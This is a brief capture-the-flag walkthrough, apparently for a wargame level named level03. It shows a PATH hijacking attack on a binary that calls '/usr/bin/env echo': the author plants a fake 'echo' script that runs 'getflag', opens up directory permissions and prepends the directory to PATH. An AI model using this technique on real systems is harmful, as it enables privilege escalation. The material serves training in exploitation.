Home directory : \[âœ“\] not empty.

This time, we found a binary file which we run:

> /usr/bin/env echo Exploit me

The vulnerability is then in the `echo` which we exploit by injecting the `getflag` command in our *homemade echo*.

```
chmod 777 .
echo 'getflag' > echo
chmod +x echo
export PATH=/home/user/level03/:$PATH
```
